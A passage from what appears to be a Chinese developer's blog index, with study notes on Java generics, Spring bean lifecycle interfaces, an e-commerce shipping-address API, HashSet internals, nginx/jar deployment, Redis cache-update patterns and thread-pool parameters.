指定未知类型，如List&lt;?&gt;。List&lt;?&gt;不等于List&lt;Object&gt; 12345List&lt;Object&gt; list1 = new ArrayList();list1.add(1); // 编译通过List&lt;?&gt; list2 = new ArrayList();list2.add(1); // 编译错误 String是Object的子类，但是List&lt;String&gt;不是List&lt;Object&gt;的子类。 1234567public static void f(List&lt;Object&gt; list) &#123;&#125;public static void main(String[] args) &#123; List&lt;String&gt; list = new ArrayList&lt;String&gt;(); f(list); // 编译错误.&#125; 如果将List&lt;Object&gt;换成List&lt;?&gt;，则可以编译通过。 注意： 相同参数类型的泛型类的继承关系取决于泛型类自身的继承结构。例如List&lt;String&gt;是Collection&lt;String&gt;的子类 当类型声明中使用通配符?时，其子类型可以在两个维度上扩展。 123例如 Collection&lt;? extends Number&gt;在维度1上扩展：List&lt;? extends Number&gt;在维度2上扩展：Collection&lt;Integer&gt; Java泛型中List、List&lt;Object&gt;、List&lt;?&gt;的区别 List：原生态类型 List&lt;Object&gt;：参数化的类型，表明List中可以容纳任意类型的对象 List&lt;?&gt;：无限定通配符类型，表示只能包含某一种未知对象类型 1234567public class DiffInGeneric &#123; public static void main(String[] args) &#123; List&lt;String&gt; strings = new ArrayList&lt;&gt;(); List list = strings;//ok List&lt;Object&gt; objects = strings;//Error: java: incompatible types: java.util.List&lt;java.lang.String&gt; cannot be converted to java.util.List&lt;java.lang.Object&gt; &#125;&#125; 我们创建了一个List&lt;String&gt;类型的对象strings，再把它赋给原生态类型List，这是可以的。但是第5行中尝试把它传递给List&lt;Object&gt;时，出现了一个类型不相容错误，注意，这是一个编译期错误。 这是因为泛型有子类型化的规则： List&lt;String&gt;是原生态类型List的一个子类型。虽然String是Object的子类型，但是由于泛型是不可协变的，List&lt;String&gt;并不是List&lt;Object&gt;的子类型，所以这里的传递无法通过编译。 List&lt;Object&gt;唯一特殊的地方只是Object是所有类型的超类，由于泛型的不可协变性，它只能表示List中可以容纳所有类型的对象，却不能表示任何参数类型的List&lt;E&gt;。 12345678public static void main(String[] args) &#123; List&lt;Object&gt; list = new ArrayList&lt;&gt;(); list.add(11); list.add("sss"); for(Object o:list)&#123; System.out.println(o); &#125;&#125; 输出结果： 1211sss 总结： List&lt;Object&gt;:表示可用装载任意类型的对象，如上面最后一个例子，但是他不能接受List&lt;String&gt;的替换，因为不具有继承性，并且List&lt;Object&gt;如果可以被List&lt;String&gt;，就不符合原则了，因为List&lt;String&gt;只能接受String类型的对象。 List&lt;?&gt;:解决上面表面有继承关系的List的赋值问题，还有就是，他是用作声明能接收一种未知对象类型，而不是大杂烩啥都能接收。 List：原始类型，啥都没有限制。个人认为与List&lt;Object&gt;类似，但是又没有继承的限制。即啥类型都可以接收。]]></content>
      <tags>
        <tag>java基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[11.InitializingBean和DisposableBean]]></title>
    <url>%2F2018%2F07%2F21%2F11.InitializingBean%E5%92%8CDisposableBean%2F</url>
    <content type="text"><![CDATA[学习bean的初始化和销毁等。除了上一种用@Bean的方式来指定bean的初始化和销毁之外，spring还提供了另外的方法来实现。 初始化： 让Bean实现InitializingBean接口并且实现它的afterPropertiesSet方法，他的作用时机是：当一个BeanFactory创建之后并且所有的属性值已经被设置完成之后，可以调用这个方法来进行初始化的工作。 123public interface InitializingBean &#123; void afterPropertiesSet() throws Exception;&#125; 销毁： 让Bean实现DisposableBean接口并且实现destroy方法，他的作用时机是BeanFactory销毁的时候也将单实例bean给销毁掉。 123public interface DisposableBean &#123; void destroy() throws Exception;&#125; 示例： 123456789101112131415public class Cat implements InitializingBean,DisposableBean&#123; public Cat()&#123; System.out.println("cat constructor..."); &#125; @Override public void destroy() throws Exception &#123; System.out.println("cat destory..."); &#125; @Override public void afterPropertiesSet() throws Exception &#123; System.out.println("cat afterPropertiesSet init..."); &#125;&#125; 最后打印一下，发现达到了一样的效果： 1234cat constructor...cat afterPropertiesSet init...容器已经启动成功...cat destory...]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[10、收货地址管理模块]]></title>
    <url>%2F2018%2F07%2F21%2F10%E3%80%81%E6%94%B6%E8%B4%A7%E5%9C%B0%E5%9D%80%E7%AE%A1%E7%90%86%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[收货地址管理模块 1.添加地址1http://localhost:8080/shipping/add.do?userId=1&amp;receiverName=geely&amp;receiverPhone=010&amp;receiverMobile=18688888888&amp;receiverProvince=%E5%8C%97%E4%BA%AC&amp;receiverCity=%E5%8C%97%E4%BA%AC%E5%B8%82&amp;receiverAddress=%E4%B8%AD%E5%85%B3%E6%9D%91&amp;receiverZip=100000 request12345678userId=1receiverName=geelyreceiverPhone=010receiverMobile=18688888888receiverProvince=北京receiverCity=北京市receiverAddress=中关村receiverZip=100000 success1234567&#123; &quot;status&quot;: 0, &quot;msg&quot;: &quot;新建地址成功&quot;, &quot;data&quot;: &#123; &quot;shippingId&quot;: 28 &#125;&#125; fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;新建地址失败&quot;&#125; controller123456789@RequestMapping("add.do")@ResponseBodypublic ServerResponse add(HttpSession session, Shipping shipping)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),ResponseEnum.NEED_LOGIN.getDesc()); &#125; return shippingService.add(user.getId(),shipping);&#125; 对应的service是：12345678910public ServerResponse add(Integer userId, Shipping shipping)&#123; shipping.setUserId(userId); int rowCount = shippingMapper.insert(shipping); if(rowCount &gt; 0)&#123; Map result = Maps.newHashMap(); result.put("shippingId",shipping.getId()); return ServerResponse.createBySuccess("新建地址成功",result); &#125; return ServerResponse.createByErrorMessage("新建地址失败");&#125; 这里要注意防止横向越权，所以需要将userId传进来，这个userId是直接根据session传进来的，所以防止操作其他用户的地址信息。在插入成功之后，要将id返回到前端，需要在insert中增加如下才能获取到刚生成的id：1useGeneratedKeys=&quot;true&quot; keyProperty=&quot;id&quot; 2.删除地址1/shipping/del.do request1shippingId success1234&#123; &quot;status&quot;: 0, &quot;msg&quot;: &quot;删除地址成功&quot;&#125; fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;删除地址失败&quot;&#125; controller123456789@RequestMapping("del.do")@ResponseBodypublic ServerResponse del(HttpSession session, Integer shippingId)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),ResponseEnum.NEED_LOGIN.getDesc()); &#125; return shippingService.del(user.getId(),shippingId);&#125; 对应的service：12345678910public ServerResponse&lt;String&gt; del(Integer userId,Integer shippingId)&#123; if(shippingId == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.ILLEGAL_ARGUMENT.getCode(),ResponseEnum.ILLEGAL_ARGUMENT.getDesc()); &#125; int resultCount = shippingMapper.deleteByShippingIdUserId(userId,shippingId); if(resultCount&gt;0)&#123; return ServerResponse.createBySuccess("删除地址成功"); &#125; return ServerResponse.createBySuccessMessage("删除地址失败");&#125; 3.登录状态更新地址1http://localhost:8080/shipping/update.do?id=5&amp;receiverName=AAA&amp;receiverPhone=010&amp;receiverMobile=18688888888&amp;receiverProvince=%E5%8C%97%E4%BA%AC&amp;receiverCity=%E5%8C%97%E4%BA%AC%E5%B8%82&amp;receiverDistrict=%E6%B5%B7%E6%B7%80%E5%8C%BA&amp;receiverAddress=%E4%B8%AD%E5%85%B3%E6%9D%91&amp;receiverZip=100000 request12345678id=1receiverName=geelyreceiverPhone=010receiverMobile=18688888888receiverProvince=北京receiverCity=北京市receiverAddress=中关村receiverZip=100000 success1234&#123; &quot;status&quot;: 0, &quot;msg&quot;: &quot;更新地址成功&quot;&#125; fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;更新地址失败&quot;&#125; controller123456789@RequestMapping("update.do")@ResponseBodypublic ServerResponse update(HttpSession session, Shipping shipping)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),ResponseEnum.NEED_LOGIN.getDesc()); &#125; return shippingService.update(user.getId(),shipping);&#125; 对应的service：12345678public ServerResponse update(Integer userId, Shipping shipping)&#123; shipping.setUserId(userId); int rowCount = shippingMapper.updateByShipping(shipping); if(rowCount &gt; 0)&#123; return ServerResponse.createBySuccess("更新地址成功"); &#125; return ServerResponse.createByErrorMessage("更新地址失败");&#125; 注意这里的更新操作是要自己写的xml，因为涉及到一个userId是不用变的：12345678910111213141516&lt;update id="updateByShipping" parameterType="com.swg.pojo.Shipping"&gt;update mmall_shippingsetreceiver_name = #&#123;receiverName,jdbcType=VARCHAR&#125;,receiver_phone = #&#123;receiverPhone,jdbcType=VARCHAR&#125;,receiver_mobile = #&#123;receiverMobile,jdbcType=VARCHAR&#125;,receiver_province = #&#123;receiverProvince,jdbcType=VARCHAR&#125;,receiver_city = #&#123;receiverCity,jdbcType=VARCHAR&#125;,receiver_district = #&#123;receiverDistrict,jdbcType=VARCHAR&#125;,receiver_address = #&#123;receiverAddress,jdbcType=VARCHAR&#125;,receiver_zip = #&#123;receiverZip,jdbcType=VARCHAR&#125;,create_time = #&#123;createTime,jdbcType=TIMESTAMP&#125;,update_time = now()where id = #&#123;id,jdbcType=INTEGER&#125;and user_id = #&#123;userId,jdbcType=INTEGER&#125;&lt;/update&gt; 4.选中查看具体的地址1/shipping/select.do request1shippingId success12345678910111213141516&#123; &quot;status&quot;: 0, &quot;data&quot;: &#123; &quot;id&quot;: 4, &quot;userId&quot;: 13, &quot;receiverName&quot;: &quot;geely&quot;, &quot;receiverPhone&quot;: &quot;010&quot;, &quot;receiverMobile&quot;: &quot;18688888888&quot;, &quot;receiverProvince&quot;: &quot;北京&quot;, &quot;receiverCity&quot;: &quot;北京市&quot;, &quot;receiverAddress&quot;: &quot;中关村&quot;, &quot;receiverZip&quot;: &quot;100000&quot;, &quot;createTime&quot;: 1485066385000, &quot;updateTime&quot;: 1485066385000 &#125;&#125; fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;请登录之后查询&quot;&#125; controller123456789@RequestMapping("select.do")@ResponseBodypublic ServerResponse&lt;Shipping&gt; select(HttpSession session, Integer shippingId)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),ResponseEnum.NEED_LOGIN.getDesc()); &#125; return shippingService.select(user.getId(),shippingId);&#125; 对应的service：1234567public ServerResponse&lt;Shipping&gt; select(Integer userId, Integer shippingId)&#123; Shipping shipping = shippingMapper.selectByShippingIdUserId(userId,shippingId); if(shipping == null)&#123; return ServerResponse.createByErrorMessage("无法查询到该地址"); &#125; return ServerResponse.createBySuccess("查询地址成功",shipping);&#125; 5.地址列表1http://localhost:8080/shipping/list.do request1pageNum(默认1),pageSize(默认10) success1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&#123; &quot;status&quot;: 0, &quot;data&quot;: &#123; &quot;pageNum&quot;: 1, &quot;pageSize&quot;: 10, &quot;size&quot;: 2, &quot;orderBy&quot;: null, &quot;startRow&quot;: 1, &quot;endRow&quot;: 2, &quot;total&quot;: 2, &quot;pages&quot;: 1, &quot;list&quot;: [ &#123; &quot;id&quot;: 4, &quot;userId&quot;: 13, &quot;receiverName&quot;: &quot;geely&quot;, &quot;receiverPhone&quot;: &quot;010&quot;, &quot;receiverMobile&quot;: &quot;18688888888&quot;, &quot;receiverProvince&quot;: &quot;北京&quot;, &quot;receiverCity&quot;: &quot;北京市&quot;, &quot;receiverAddress&quot;: &quot;中关村&quot;, &quot;receiverZip&quot;: &quot;100000&quot;, &quot;createTime&quot;: 1485066385000, &quot;updateTime&quot;: 1485066385000 &#125;, &#123; &quot;id&quot;: 5, &quot;userId&quot;: 13, &quot;receiverName&quot;: &quot;AAA&quot;, &quot;receiverPhone&quot;: &quot;010&quot;, &quot;receiverMobile&quot;: &quot;18688888888&quot;, &quot;receiverProvince&quot;: &quot;北京&quot;, &quot;receiverCity&quot;: &quot;北京市&quot;, &quot;receiverAddress&quot;: &quot;中关村&quot;, &quot;receiverZip&quot;: &quot;100000&quot;, &quot;createTime&quot;: 1485066392000, &quot;updateTime&quot;: 1485075875000 &#125; ], &quot;firstPage&quot;: 1, &quot;prePage&quot;: 0, &quot;nextPage&quot;: 0, &quot;lastPage&quot;: 1, &quot;isFirstPage&quot;: true, &quot;isLastPage&quot;: true, &quot;hasPreviousPage&quot;: false, &quot;hasNextPage&quot;: false, &quot;navigatePages&quot;: 8, &quot;navigatepageNums&quot;: [ 1 ] &#125;&#125; fail1234&#123; &quot;status&quot;: 1, &quot;msg&quot;: &quot;请登录之后查询&quot;&#125; controller1234567891011@RequestMapping("list.do")@ResponseBodypublic ServerResponse&lt;PageInfo&gt; list(@RequestParam(value = "pageNum",defaultValue = "1") int pageNum, @RequestParam(value = "pageSize",defaultValue = "10") int pageSize, HttpSession session)&#123; User user = (User)session.getAttribute(Constants.CURRENT_USER); if(user == null)&#123; return ServerResponse.createByErrorCodeMessage(ResponseEnum.NEED_LOGIN.getCode(),ResponseEnum.NEED_LOGIN.getDesc()); &#125; return shippingService.list(user.getId(),pageNum,pageSize);&#125; 对应的service：123456public ServerResponse&lt;PageInfo&gt; list(Integer userId,int pageNum,int pageSize)&#123; PageHelper.startPage(pageNum,pageSize); List&lt;Shipping&gt; shippingList = shippingMapper.selectByUserId(userId); PageInfo pageInfo = new PageInfo(shippingList); return ServerResponse.createBySuccess(pageInfo);&#125;]]></content>
      <tags>
        <tag>电商项目实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[10、HashSet源码解析]]></title>
    <url>%2F2018%2F07%2F21%2F10%E3%80%81HashSet%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[本文分析HashSet源码. 关注点 结论 HashSet是否允许空 允许 HashSet是否允许重复数据 不允许重复 HashSet是否有序 无序 HashSet是否线程安全 非线程安全 对于HashSet而言，它是基于HashMap实现的，HashSet底层使用HashMap来保存所有元素，因此HashSet 的实现比较简单，相关HashSet的操作，基本上都是直接调用底层HashMap的相关方法来完成。 一、继承关系123public class HashSet&lt;E&gt; extends AbstractSet&lt;E&gt; implements Set&lt;E&gt;, Cloneable, java.io.Serializable 从中我们可以了解到： extends AbstractSet&lt;E&gt;：继承了AbstractSet，父类自己实现了equals、hashCode、removeAll三个方法。 implements Set&lt;E&gt;：实现了Set，提供了所有可选的Set操作。 implements Cloneable：表明其可以调用clone()方法来返回实例的field-for-field拷贝。 implements Serializable：表明该类是可以序列化的。 二、属性123456//HashSet是依赖于HashMap的，底层就是一个HashMap实例。private transient HashMap&lt;E,Object&gt; map;//HashMap是保存键值对的，但我们保存hashSet的时候肯定只是想保存key，那么调用hashMap(key,value)时value应该传什么值呢？//PRESENT就是value。private static final Object PRESENT = new Object(); 其中的map就是HashSet的内部数据结构，所以说HashSet其实就是HashMap是实现的，另外的一个final的Object对象，是我们用来填充map的Value的，而Set中真正的数据，都放在了HashMap的K中。 三、构造方法123456789101112131415161718192021222324252627//构造一个新的空set，其底层HashMap实例的默认初始容量是 16，加载因子是0.75public HashSet() &#123; map = new HashMap&lt;&gt;();&#125;//构造一个包含指定集合c中的元素的新set。使用默认的加载因子0.75和足以包含指定指定集合c中所有元素的初始容量来创建HashMappublic HashSet(Collection&lt;? extends E&gt; c) &#123; //如果数量大于默认的16，根据实际size/0.75来初始化容量 map = new HashMap&lt;&gt;(Math.max((int) (c.size()/.75f) + 1, 16)); addAll(c);&#125;//构造一个新的空set，其底层HashMap实例具有指定的初始容量initialCapacity和指定的加载因子loadFactorpublic HashSet(int initialCapacity, float loadFactor) &#123; map = new HashMap&lt;&gt;(initialCapacity, loadFactor);&#125;//构造一个新的空set，其底层HashMap实例具有指定的初始容量initialCapacity和默认的加载因子（0.75）public HashSet(int initialCapacity) &#123; map = new HashMap&lt;&gt;(initialCapacity);&#125;//构造一个新的空set。因为权限为包权限，这个构造方法仅仅被LinkedHashSet使用。（在API中没有这个构造函数，其他的构造方法都是public的）HashSet(int initialCapacity, float loadFactor, boolean dummy) &#123; map = new LinkedHashMap&lt;&gt;(initialCapacity, loadFactor);&#125; 四、一些方法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162/** * 返回对此set中元素进行迭代的迭代器。返回元素的顺序并不是特定的。 */public Iterator&lt;E&gt; iterator() &#123; return map.keySet().iterator();&#125;/** * 返回此set中的元素的数量（set的容量）。 */public int size() &#123; return map.size(); &#125;/** * 如果此set不包含任何元素，则返回true。 */public boolean isEmpty() &#123; return map.isEmpty();&#125;/** * 如果此set包含指定元素，则返回true。 更确切地讲，当且仅当此set包含一个满足 (o==null ? e==null : o.equals(e)) 的 e 元素时，返回true。 */public boolean contains(Object o) &#123; return map.containsKey(o);&#125;/** * 如果此set中尚未包含指定元素，则添加指定元素 */public boolean add(E e) &#123; return map.put(e, PRESENT)==null;&#125;/** * 如果指定元素存在于此set中，则将其移除。 */public boolean remove(Object o) &#123; return map.remove(o)==PRESENT;&#125;/** * 从此 set 中移除所有元素。 */public void clear() &#123; map.clear();&#125;/** * 返回hashSet的浅拷贝，注意：并没有复制这些元素本身。 */@SuppressWarnings(&quot;unchecked&quot;)public Object clone() &#123; try &#123; HashSet&lt;E&gt; newSet = (HashSet&lt;E&gt;) super.clone(); newSet.map = (HashMap&lt;E, Object&gt;) map.clone(); return newSet; &#125; catch (CloneNotSupportedException e) &#123; throw new InternalError(e); &#125;&#125; 如果此 set 中尚未包含指定元素，则添加指定元素。更确切地讲，如果此 set 没有包含满足(e==null ? e2==null : e.equals(e2)) 的元素 e2，则向此 set 添加指定的元素 e。如果此 set 已包含该元素，则该调用不更改 set 并返回 false。但底层实际将将该元素作为 key 放入 HashMap。思考一下为什么？ 由于 HashMap 的 put() 方法添加 key-value对时，当新放入 HashMap 的 Entry 中 key 与集合中原有 Entry 的 key 相同（hashCode()返回值相等，通过 equals 比较也返回 true），新添加的 Entry 的 value 会将覆盖原来 Entry 不会有任何改变，因此如果向 HashSet 中添加一个已经存在的元素时，新添加的集合元素将不会被放入 HashMap中，原来的元素也不会有任何改变，这也就满足了 Set 中元素不重复的特性。 该方法如果添加的是在 HashSet 中不存在的，则返回 true；如果添加的元素已经存在，返回 false。其原因在于我们之前提到的关于 HashMap 的 put 方法。该方法在添加 key 不重复的键值对的时候，会返回 null。 所以，对于 HashSet 中保存的对象，请注意正确重写其 equals 和 hashCode 方法，以保证放入的对象的唯一性。这两个方法是比较重要的。]]></content>
      <tags>
        <tag>java容器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[10.部署]]></title>
    <url>%2F2018%2F07%2F21%2F10.%E9%83%A8%E7%BD%B2%2F</url>
    <content type="text"><![CDATA[慕课网微信点餐系统学习 线上地址演示： 前台(需要在微信端打开)：www.oursnail.cn 后台：www.oursnail.cn/sell/login 其实比本地部署简单多了，就是安装jdk和nginx以及mysql. 其中nginx的配置为： 123456789101112131415161718server &#123; listen 80; server_name www.oursnail.cn; #charset koi8-r; #access_log logs/host.access.log main; location / &#123; root /opt/wwwroot/sell; index index.html index.htm; &#125; location /sell/ &#123; proxy_pass http://111.231.119.253:8080; &#125; ... 项目的前端跟在本地部署的一样，我是直接将文件拷贝到/opt/wwwroot/sell目录下。后端，直接打包： 1mvn clean package -Dmaven.test.skip=true 指定jar包名字： 在pom文件中的最后&lt;build&gt;下面添加： 1&lt;finalName&gt;sell&lt;/finalName&gt; 将打出来的jar包拷贝到服务器下，执行java -jar，确认服务可以正常启动。 那如何在后台让它启动呢？ 1nohup java -jar sell.jar &gt; /dev/null 2&gt;&amp;1 &amp; 成功的话会出现一个进程号。 当然了，也可以打成war包放到tomcat目录下，但是有缺点：切换端口麻烦、不能在启动的时候随意切换环境等]]></content>
      <tags>
        <tag>微信点餐系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[11.缓存更新]]></title>
    <url>%2F2018%2F07%2F21%2F11.%E7%BC%93%E5%AD%98%E6%9B%B4%E6%96%B0%2F</url>
    <content type="text"><![CDATA[redis缓存更新策略学习。 更新缓存的的Design Pattern有四种：Cache aside, Read through, Write through, Write behind caching，我们下面一一来看一下这四种Pattern。这里，我们先不讨论更新缓存和更新数据这两个事是一个事务的事，或是会有失败的可能，我们先假设更新数据库和更新缓存都可以成功的情况（我们先把成功的代码逻辑先写对）。 先来看看缓存可能存在的一些问题，目的是突出缓存使用策略选择的重要性。 1.缓存穿透缓存穿透是说访问一个缓存中没有的数据，但是这个数据数据库中也不存在。 解决方案是： 缓存空对象。如果缓存未命中，而数据库中也没有这个对象，则可以缓存一个空对象到缓存。如果使用Redis，这种key需设置一个较短的时间，以防内存浪费。 缓存预测。预测key是否存在。如果缓存的量不大可以使用hash来判断，如果量大可以使用布隆过滤器来做判断。采用布隆，将所有可能存在的数据哈希到一个足够大的BitSet中，不存在的数据将会被拦截掉，从而避免了对存储系统的查询压力。 2.缓存并发多个客户端同时访问一个没有在cache中的数据，这时每个客户端都会执行从DB加载数据set到缓存，就会造成缓存并发。 缓存预热。提前把所有预期的热数据加到缓存。定位热数据还是比较复杂的事情，需要根据自己的服务访问情况去评估。这个方案只能减轻缓存并发的发生次数不能全部抵制。 缓存加锁。 如果多个客户端访问不存在的缓存时，在执行加载数据并set缓存这个逻辑之前先加锁，只能让一个客户端执行这段逻辑。 3.缓存雪崩缓存雪崩是缓存服务暂时不能提供服务，导致所有的请求都直接访问DB。 解决方案： 构建高可用的缓存系统。目前常用的缓存系统Redis和Memcache都支持高可用的部署方式，所以部署的时候不防先考虑是否要以高可用的集群方式部署。 限流。Netflix的Hystrix是非常不错的工具，在用缓存时不妨搭配它来使用。 4.Cache Aside Pattern一种错误的做法是：先删除缓存，然后再更新数据库，而后续的操作会把数据再装载的缓存中。试想，两个并发操作，一个是更新操作，另一个是查询操作，更新操作删除缓存后，查询操作没有命中缓存，先把老数据读出来后放到缓存中，然后更新操作更新了数据库。于是，在缓存中的数据还是老的数据，导致缓存中的数据是脏的，直到这个缓存失效为止。 Cache Aside Pattern是最常用最常用的pattern了。其具体逻辑如下： 失效：应用程序先从cache取数据，没有得到，则从数据库中取数据，成功后，放到缓存中。 命中：应用程序从cache中取数据，取到后返回。 更新：先把数据存到数据库中，成功后，再让缓存失效。 注意，我们的更新是先更新数据库，成功后，让缓存失效。那么，这种方式是否可以没有文章前面提到过的那个问题呢？ 一个是查询操作，一个是更新操作的并发，首先，没有了删除cache数据的操作了，而是先更新了数据库中的数据，此时，缓存依然有效，所以，并发的查询操作拿的是没有更新的数据，但是，更新操作马上让缓存的失效了，后续的查询操作再把数据从数据库中拉出来。而不会像文章开头的那个逻辑产生的问题，后续的查询操作一直都在取老的数据。 但是还有存在问题的。比如，一个是读操作，但是没有命中缓存，然后就到数据库中取数据，此时来了一个写操作，写完数据库后，让缓存失效，然后，之前的那个读操作再把老的数据放进去，所以，会造成脏数据。不过，实际上出现的概率可能非常低. 所以，这也就是Quora上的那个答案里说的，要么通过2PC或是Paxos协议保证一致性，要么就是拼命的降低并发时脏数据的概率，而Facebook使用了这个降低概率的玩法，因为2PC太慢，而Paxos太复杂。当然，最好还是为缓存设置上过期时间。 5.Read/Write Through Pattern Read Through：读取数据的时候如果当前缓存中没有数据，惯常的操作都是应用程序去DB加载数据，然后加入到缓存中。Read Through与之不同的是我们不需要在应用程序自己加载数据了，缓存层会帮忙做件事。 Write Through：更新数据的时候，如果命中缓存，则先更新缓存然后缓存在负责把数据更新到数据库；如果没有命中缓存则直接更新数据库。 这种方式缓存层直接屏蔽了DB，应用程序只需要更缓存打交道。优点是应用逻辑简单了，而且更高效了；缺点是缓存层的实现相对复杂一些。 6.Write Back PatternWrite Back套路，一句说就是，在更新数据的时候，只更新缓存，不更新数据库，而我们的缓存会异步地批量更新数据库。这个设计的好处就是让数据的I/O操作飞快无比（因为直接操作内存嘛 ），因为异步，write backg还可以合并对同一个数据的多次操作，所以性能的提高是相当可观的。 但是，其带来的问题是，数据不是强一致性的，而且可能会丢失（我们知道Unix/Linux非正常关机会导致数据丢失，就是因为这个事）。在软件设计上，我们基本上不可能做出一个没有缺陷的设计，就像算法设计中的时间换空间，空间换时间一个道理，有时候，强一致性和高性能，高可用和高性性是有冲突的。 另外，Write Back实现逻辑比较复杂，因为他需要track有哪数据是被更新了的，需要刷到持久层上。操作系统的write back会在仅当这个cache需要失效的时候，才会被真正持久起来，比如，内存不够了，或是进程退出了等情况，这又叫lazy write。 7.实际使用的一些策略业务方（调用者）更新传统上，更新缓存都是由业务方来做，也就是由调用者负责更新DB和缓存。 DB中间件监听DB变化，更新缓存现在有种新的办法就是利用DB中间件监听DB变化（比如阿里的Canal中间件，点评的Puma），从而对缓存进行更新。这种办法的一个好处就是：把缓存的更新逻辑，和业务逻辑解藕。业务只更新DB，缓存的更新被放在另外一个专门的系统里面。 8.总结一句话，无论谁先谁后，只要更新缓存和更新DB不是原子的，就可能导致不一致。 总之，只是从实际业务来讲，一般缓存也都是保持“最终一致性“，而不是和DB的强一致性。 并且一般建议先更新DB，再更新缓存，优先保证DB数据正确。 9.一致性问题上面，我们没有考虑缓存（Cache）和持久层（Repository）的整体事务的问题。比如，更新Cache成功，更新数据库失败了怎么吗？或是反过来。关于这个事，如果你需要强一致性，你需要使用“两阶段提交协议”——prepare, commit/rollback.后续再探讨。 参考1：https://coolshell.cn/articles/17416.html 参考2：https://www.jianshu.com/p/3c111e4719b8 参考3：https://blog.csdn.net/chunlongyu/article/details/53384933]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[10.线程池]]></title>
    <url>%2F2018%2F07%2F21%2F10.%E7%BA%BF%E7%A8%8B%E6%B1%A0%2F</url>
    <content type="text"><![CDATA[线程池的原理是面试的重灾区。本篇将完整分析线程池的原理。 1. 初步认识线程池1.1 new thread弊端从学习java多线程开始，我们就学习了用new thread来创建线程。但是他有一定的弊端： 每次new Thread新建对象，性能差 线程缺乏统一管理，可能无限制的新建线程，相互竞争，有可能占用过多系统资源导致死机或OOM 缺少更多功能，如更多执行、定期执行、线程中断 1.2 线程池好处 重用存在的线程，减少对象创建、消亡的开销，性能佳 可有效控制最大并发线程数，提高系统资源利用率，同时可以避免过多资源竞争，避免阻塞 提供定时执行、定期执行、单线程、并发数控制等功能 1.3 线程池相关参数1234567public ThreadPoolExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) corePoolSize:核心线程数量 默认情况下，在创建了线程池后，线程池中的线程数为0，（除非调用prestartAllCoreThreads()和prestartCoreThread()方法，从方法名字可以看出，是预创建线程的意思，即在没有任务到来之前，就创建corePoolSize个线程或1个线程）当有任务来之后，就会创建一个线程去执行任务，当线程池中的线程数目达到corePoolSize后，就会把到达的任务放到缓存队列当中； 当提交一个任务到线程池时，线程池会创建一个线程来执行任务，即使其他空闲的基本线程能够执行新任务也会创建线程，等到需要执行的任务数大于线程池基本大小时就不再创建。 maximumPoolSize:线程最大线程数 线程池中的最大线程数，表示线程池中最多能创建多少个线程。 超过就reject:如果队列满了,并且已创建的线程数小于最大线程数，则线程池会再创建新的线程执行任务 workQueue:阻塞队列，存储等待执行的任务，很重要，会对线程池运行过程产生重大影响，一般有以下几种选择： ArrayBlockingQueue：是一个基于数组结构的有界阻塞队列，此队列按 FIFO（先进先出）原则对元素进行排序； LinkedBlockingQueue：一个基于链表结构的阻塞队列，此队列按FIFO （先进先出） 排序元素，吞吐量通常要高于ArrayBlockingQueue。静态工厂方法Executors.newFixedThreadPool()使用了这个队列； SynchronousQueue：一个不存储元素的阻塞队列。每个插入操作必须等到另一个线程调用移除操作，否则插入操作一直处于阻塞状态，吞吐量通常要高于LinkedBlockingQueue，静态工厂方法Executors.newCachedThreadPool使用了这个队列； PriorityBlockingQueue：一个具有优先级的无限阻塞队列；底层用DelayedWorkQueue实现。 keepAliveTime：线程没有任务执行时最多保持多久时间终止 当线程池中的线程数大于corePoolSize时，如果一个线程空闲的时间达到keepAliveTime，则会终止，直到线程池中的线程数不超过corePoolSize。（但是如果调用了allowCoreThreadTimeOut(boolean value)方法，在线程池中的线程数不大于corePoolSize时，keepAliveTime参数也会起作用，直到线程池中的线程数为0；） unit:keepAliveTime的时间单位 threadFactory：线程工厂，用来创建线程 threadFactory用于设置创建线程的工厂，可以通过线程工厂给每个创建出来的线程设置更有意义的名字 handler:饱和策略 当队列和线程池都满了，说明线程池处于饱和状态，那么必须采取一种策略处理提交的新任务。这个策略默认情况下是AbortPolicy，表示无法处理新任务时抛出异常。 1.4 线程池工作原理提交一个任务到线程池中，线程池的处理流程如下： 判断线程池里的核心线程是否都在执行任务，如果不是（核心线程空闲或者还有核心线程没有被创建）则创建一个新的工作线程来执行任务。如果核心线程都在执行任务，则进入下个流程。 线程池判断工作队列是否已满，如果工作队列没有满，则将新提交的任务存储在这个工作队列里。如果工作队列满了，则进入下个流程。 判断线程池里的线程是否都处于工作状态，如果没有，则创建一个新的工作线程来执行任务。如果已经满了，则交给饱和策略来处理这个任务。 1.5 饱和策略1234java.util.concurrent.ThreadPoolExecutor.AbortPolicyjava.util.concurrent.ThreadPoolExecutor.CallerRunsPolicyjava.util.concurrent.ThreadPoolExecutor.DiscardOldestPolicyjava.util.concurrent.ThreadPoolExecutor.DiscardPolicy 